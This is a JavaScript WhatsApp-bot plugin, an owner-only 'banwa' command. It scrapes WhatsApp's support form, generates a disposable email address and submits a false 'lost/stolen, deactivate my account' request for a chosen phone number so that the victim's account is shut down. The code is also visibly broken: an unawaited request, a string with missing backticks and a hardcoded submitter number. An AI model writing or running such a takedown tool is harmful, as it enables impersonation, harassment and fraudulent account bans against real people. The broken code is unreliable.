const axios = require('axios')
const cheerio = require('cheerio')
exports.run = {
   usage: ['banwa'],
   use: '628xxx',
   category: 'owner',
   async: async (m, {
      client,
      text,
      isPrefix,
      command
   }) => {
      try {
         if (!text) return client.reply(m.chat, Func.example(isPrefix, command, '62xxxx'), m)
         let p = (await client.onWhatsApp(text))[0] || {}
         if (!p.exists) return client.reply(m.chat, Func.texted('bold', '🚩 Number not registered on WhatsApp.'), m)
         let number = p.jid.replace(/@.+/, '')
         let ntah = await axios.get('https://www.whatsapp.com/contact/noclient/')
         let email = axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1')
         let cookie = ntah.headers['set-cookie']
         let $ = cheerio.load(ntah.data)
         let $form = $('form')
         let url = new URL($form.attr('action'), 'https://www.whatsapp.com').href
         let form = new URLSearchParams()
         form.append('jazoest', $form.find('input[name=jazoest]').val())
         form.append('lsd', $form.find('input[name=lsd]').val())
         form.append('step', 'submit')
         form.append('country_selector', 'ID')
         form.append('phone_number', 6283861969302)
         form.append('email', email.data[0])
         form.append('email_confirm', email.data[0])
         form.append('platform', 'ANDROID')
         form.append('your_message', Hilang/Dicuri: Nonaktifkan akun saya ${number})
         form.append('__user', '0')
         form.append('__a', '1')
         form.append('__csr', '')
         form.append('__req', '8')
         form.append('__hs', '19316.BP:whatsapp_www_pkg.2.0.0.0.0')
         form.append('dpr', '1')
         form.append('__ccg', 'UNKNOWN')
         form.append('__rev', '1006630858')
         form.append('__comment_req', '0')
         let res = await axios({
            url,
            method: 'POST',
            data: form,
            headers: {
               cookie
            }
         })
         client.reply(m.chat, Func.jsonFormat(JSON.parse(res.data.replace('for (;;);', ''))), m)
      } catch (e) {
         return client.reply(m.chat, Func.jsonFormat(e), m)
      }
   },
   owner: true,
   cache: true,
   location: __filename
}
